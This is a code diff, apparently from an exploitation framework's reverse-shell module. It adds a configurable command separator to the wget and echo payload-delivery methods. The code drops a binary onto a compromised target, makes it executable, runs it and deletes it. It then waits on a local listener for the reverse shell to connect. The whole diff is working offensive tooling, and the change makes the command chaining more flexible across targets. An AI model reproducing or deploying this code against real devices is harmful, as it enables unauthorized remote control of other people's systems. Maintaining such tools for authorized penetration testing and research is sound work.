@@ -34,9 +34,9 @@ def shell(exploit, architecture="", method="", **params):
                 revshell = reverse_shell(exploit, architecture, lhost, lport)
 
                 if method == "wget":
-                    revshell.wget(binary=params['binary'], location=params['location'])
+                    revshell.wget(binary=params['binary'], location=params['location'], concat=params['concat'])
                 elif method == "echo":
-                    revshell.echo(binary=params['binary'], location=params['location'])
+                    revshell.echo(binary=params['binary'], location=params['location'], concat=params['concat'])
                 elif method == "awk":
                     revshell.awk(binary=params['binary'])
                 elif method == "netcat":
@@ -405,12 +405,12 @@ class reverse_shell(object):
 
         # execute binary
         sock = self.listen(self.lhost, self.lport)
-        self.execute_binary(location, self.binary_name)
+        self.execute_binary(location, self.binary_name, concat)
 
         # waiting for shell
         self.shell(sock)
 
-    def echo(self, binary, location):
+    def echo(self, binary, location, concat):
         print_status("Using echo method")
 
         # generate binary
@@ -433,7 +433,7 @@ class reverse_shell(object):
 
         # execute binary
         sock = self.listen(self.lhost, self.lport)
-        self.execute_binary(location, self.binary_name)
+        self.execute_binary(location, self.binary_name, concat)
 
         # waiting for shell
         self.shell(sock)
@@ -459,9 +459,9 @@ class reverse_shell(object):
         # waiting for shell
         self.shell(sock)
 
-    def execute_binary(self, location, binary_name):
+    def execute_binary(self, location, binary_name, concat):
         path = "{}/{}".format(location, binary_name)
-        cmd = "chmod 777 {}; {}; rm {}".format(path, path, path)
+        cmd = "chmod 777 {}{}{}{}rm {}".format(path, concat, path, concat, path)
 
         thread = threading.Thread(target=self.exploit.execute, args=(cmd,))
         thread.start()
